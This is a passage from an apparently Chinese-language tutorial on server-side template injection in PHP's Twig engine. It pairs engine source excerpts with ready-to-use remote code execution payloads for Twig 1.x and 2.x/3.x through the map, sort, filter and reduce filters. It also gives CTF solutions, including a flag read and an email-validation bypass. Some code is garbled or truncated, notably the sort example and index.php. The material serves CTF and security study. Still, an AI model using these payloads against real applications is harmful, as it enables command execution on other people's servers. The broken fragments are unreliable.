        if (false !== $filter = call_user_func($callback, $name)) {
          return $filter;
        }
      }
      return false;
    }
    public function registerUndefinedFilterCallback($callable)
    {
      $this->filterCallbacks[] = $callable;
    }
我们在 `getFilter` 里发现了危险函数 `call_user_func`。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload
如下：
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
    // Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
但是在 Twig 2.x 及 Twig 3.x 以后，`_self` 的作用发生了变化，只能返回当前实例名字符串：
所以以上 Payload 只能适用于 Twig 1.x 。
### Twig 2.x / 3.x
测试代码如下：
  * index.php
    createTemplate("Hello {$_GET['name']}!");
    echo $template->render();
到了 Twig 2.x / 3.x 版本中，`__self` 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。
#### 使用 map 过滤器
在 Twig 3.x 中，`map` 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：
    {% set people = [
        {first: "Bob", last: "Smith"},
        {first: "Alice", last: "Dupond"},
    ] %}
    {{ people|map(p => "#{p.first} #{p.last}")|join(', ') }}
    // Output: outputs Bob Smith, Alice Dupond
    {% set people = {
        "Bob": "Smith",
        "Alice": "Dupond",
    } %}
    {{ people|map((last, first) => "#{first} #{last}")|join(', ') }}
    // Output: outputs Bob Smith, Alice Dupond
当我们如下使用 `map` 时：
    {{["Mark"]|map((arg)=>"Hello #{arg}!")}}
Twig 3.x 会将其编译成：
    twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))})
这个 `twig_array_map` 函数的源码如下：
    function twig_array_map($array, $arrow)
    {
        $r = [];
        foreach ($array as $k => $v) {
            $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
        }
        return $r;
    }
从上面的代码我们可以看到，传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是
`$array` 中的 value 和 key。`$array` 和 `$arrow`
都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：
    system ( string $command [, int &$return_var ] ) : string
    passthru ( string $command [, int &$return_var ] )
    exec ( string $command [, array &$output [, int &$return_var ]] ) : string
    shell_exec ( string $cmd ) : string
前三个都可以使用。相应的 Payload 如下：
    {{["id"]|map("system")}}
    {{["id"]|map("passthru")}}
    {{["id"]|map("exec")}}    // 无回显
其中，`{{["id"]|map("system")}}` 会被成下面这样：
    twig_array_map([0 => "id"], "sysetm")
最终在 `twig_array_map` 函数中将执行 `system('id',0)`。执行结果如下图所示：
如果上面这些命令执行函数都被禁用了，我们还可以执行其他函数执行任意代码：
    {{["phpinfo();"]|map("assert")|join(",")}}
    {{{" a.quantity  b.quantity)|column('name') %}
        {{ fruit }}
    {% endfor %}
    // Output in this order: Oranges, Grapes, Apples
类似于 `map`，模板编译的过程中会进入 `twig_sort_filter` 函数，这个 `twig_sort_filter` 函数的源码如下：
    function twig_sort_filter($array, $arrow = null)
    {
        if ($array instanceof \Traversable) {
            $array = iterator_to_array($array);
        } elseif (!\is_array($array)) {
            throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
        }
        if (null !== $arrow) {
            uasort($array, $arrow);    // 直接被 uasort 调用 
        } else {
            asort($array);
        }
        return $array;
    }
从源码中可以看到，`$array` 和 `$arrow` 直接被 `uasort` 函数调用。众所周知 `uasort`
函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：
    php > $arr = ["id",0];
    php > usort($arr,"system");
    uid=0(root) gid=0(root) groups=0(root)
    php >
知道了做这些我们便可以构造 Payload 了：
    {{["id", 0]|sort("system")}}
    {{["id", 0]|sort("passthru")}}
    {{["id", 0]|sort("exec")}}    // 无回显
#### 使用 filter 过滤器
这个 `filter` 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：
    {% set lists = [34, 36, 38, 40, 42] %}
    {{ lists|filter(v => v > 38)|join(', ') }}
    // Output: 40, 42
类似于 `map`，模板编译的过程中会进入 `twig_array_filter` 函数，这个 `twig_array_filter` 函数的源码如下：
    function twig_array_filter($array, $arrow)
    {
        if (\is_array($array)) {
            return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
        }
        // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
        return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
    }
从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_filter`
函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：
    php > $arr = ["id"];
    php > array_filter($arr,"system");
    uid=0(root) gid=0(root) groups=0(root)
    php >
下面给出几个 Payload：
    {{["id"]|filter("system")}}
    {{["id"]|filter("passthru")}}
    {{["id"]|filter("exec")}}    // 无回显
#### 使用 reduce 过滤器
这个 `reduce` 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：
    {% set numbers = [1, 2, 3] %}
    {{ numbers|reduce((carry, v) => carry + v) }}
    // Output: 6
类似于 `map`，模板编译的过程中会进入 `twig_array_reduce` 函数，这个 `twig_array_reduce` 函数的源码如下：
    function twig_array_reduce($array, $arrow, $initial = null)
    {
        if (!\is_array($array)) {
            $array = iterator_to_array($array);
        }
        return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
    }
从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_reduce`
函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。
直接给出 Payload：
    {{[0, 0]|reduce("system", "id")}}
    {{[0, 0]|reduce("passthru", "id")}}
    {{[0, 0]|reduce("exec", "id")}}    // 无回显
## Twig 模板注入相关 CTF 例题
### [BJDCTF2020]Cookie is so stable
经测试，发现在 Cookie 处存在 SSTI 漏洞：
根据 SSTI 的测试流程发现目标环境使用了 Twig 模板，版本是 Twig 1.x，直接上 Payload 打就行了：
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
### [VolgaCTF 2020 Qualifier]Newsletter
题目给了源码：
    render('main.twig');
        }
        public function subscribe(Request $request, MailerInterface $mailer)
        {
          $msg = '';
          $email = filter_var($request->request->get('email', ''), FILTER_VALIDATE_EMAIL);
          if($email !== FALSE) {
            $name = substr($email, 0, strpos($email, '@'));
            $content = $this->get('twig')->createTemplate(
              "Hello ${name}.Thank you for subscribing to our newsletter.Regards, VolgaCTF Team"
            )->render();
            $mail = (new Email())->from('PI:EMAIL')->to($email)->subject('VolgaCTF Newsletter')->html($content);
            $mailer->send($mail);
            $msg = 'Success';
          } else {
            $msg = 'Invalid email';
          }
          return $this->render('main.twig', ['msg' => $msg]);
        }
        public function source()
        {
            return new Response(''.htmlspecialchars(file_get_contents(__FILE__)).'');
        }
    }
从代码中可以看出，我们传送过去的 `$email` 被 `substr` 函数截取了 `@` 前面的字符串，然后赋给 `$name`，最后 `$name`
直接被拼接进模板进行渲染。这就存在一个 SSTI 漏洞。
但要利用漏洞，首先要绕过 `filter_var($request->request->get('email', ''),
FILTER_VALIDATE_EMAIL);` 的限制，要求传入的 email 必须是合法的 email 格式。
在 Stack Overflow 上找到这篇文章：[PHP FILTER_VALIDATE_EMAIL does not work
correctly](https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly)，底下的回复中提供了颇为完整的合法 email
范例列表，其中可以看到一个很重要的范例：`"()<>[]:,;@\\"!#$%&'*+-/=?^_``{}|
~.a"@example.org`，这个范例告诉我们，如果 email 的 `@`
前面的部分中含有一些特殊符号，只需要使用双引号将其括起来就行了。所以我们可以构造这样的 Payload：`"{{3*4}}"@qq.com`。
最终的 Payload 如下：
    email="{{['id']|map('passthru')}}"@qq.com
## Ending......
> 参考：
>
> 
>
> 